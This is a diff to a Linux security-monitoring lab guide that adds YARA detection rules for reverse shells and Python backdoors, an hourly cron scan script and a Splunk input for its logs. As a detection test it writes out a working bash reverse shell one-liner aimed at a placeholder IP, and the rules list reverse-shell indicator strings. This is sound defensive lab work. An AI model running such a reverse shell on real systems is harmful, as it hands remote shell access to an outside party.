@@ -119,9 +119,79 @@ $ sudo auditctl -l
 
 To test the auditd configuration, we can run commands that will trigger the rules, such as a privileged command for instance. Then use `$ ausearch -k privileged_cmd` to verify that the action was logged. The auditd logs are in the /var/log/audit/audit.log file.
 
-## Yara
+## YARA
 
-Pipeline yara
+YARA is installed with `$ sudo apt install yara -y`. Once the installation is complete, check the version with `$ yara --version`. At the moment of this lab setup, the version is 4.1.3.
+
+Two YARA rules are added, in order to detect bash reverse shells and python backdoors.
+The file `/opt/yara/rules/rev_shell.yar` contains the rule to detect reverse shells:
+```
+rule Linux_Reverse_Shell_Indicators
+{
+    meta:
+        description = "Detects linux reverse shell indicators"
+	    date = "2026-06-24"
+    strings:
+        $s1 = "/dev/tcp/"
+        $s2 = "bash -i"
+        $s3 = "0>&1"
+        $s4 = "nc -e"
+        $s5 = "socket.socket"
+        $s6 = "subprocess.call"
+    condition:
+        2 of them
+}
+```
+
+The file `/opt/yara/rules/python_backdoor.yar` contains the rule to detect python backdoors:
+
+```
+rule Python_Backdoor_Indicators
+{
+    meta:
+        description = "Detects python backdoor"
+	    date = "2026-06-24"
+    strings:
+        $s1 = "import socket"
+        $s2 = "import subprocess"
+        $s3 = "import os"
+        $s4 = "subprocess.Popen"
+        $s5 = "connect("
+        $s6 = "/bin/bash"
+    condition:
+        3 of them
+}
+```
+
+YARA is triggered by a cron job through the script `/usr/local/bin/yara-scan.sh`, which runs both rules against all files from /home directory and writes any matches to a log file. The log file is created with:
+```
+$ sudo mkdir -p /var/log/yara
+$ sudo chown root:root /var/log/yara
+```
+
+The content of the script is as follows:
+```
+#!/bin/bash
+
+DATE=$(date +%F_%H-%M)
+LOG_FILE="/var/log/yara/yara-$DATE.log"
+
+yara -r /opt/yara/rules/*.yar /home > "$LOG_FILE"
+
+if [ ! -s "$LOG_FILE" ]; then
+    rm -f "$LOG_FILE"
+fi
+```
+
+After making the script `yara-scan.sh` executable, we can add the execution to `/etc/crontab`, the frequency will be once an hour:
+```
+0 * * * * root /usr/local/bin/yara-scan.sh
+```
+
+Then restart cron to apply the changes: `$ sudo systemctl restart cron`.
+
+
+To verify that the YARA detection is working, create a rev_test.sh file containing the following reverse shell: `sh -i >& /dev/tcp/10.10.10.10/9001 0>&1`, in the `/home/charlie/Downloads` directory. Wait for the yara-scan.sh script to execute, once done there should be a log file in the directory `/var/log/yara` containing the message `Linux_Reverse_Shell_Indicators /home/charlie/Downloads/rev_test.sh`
 
 
 ## Logrotate
@@ -213,6 +283,11 @@ sourcetype=sudo
 [monitor:///var/log/audit/audit.log]
 index=linux_os
 sourcetype=linux_audit
+
+[monitor:///var/log/yara]
+index = linux_os
+sourcetype = yara
+recursive = false
 ```
 
 Then restart the splunk forwarder:
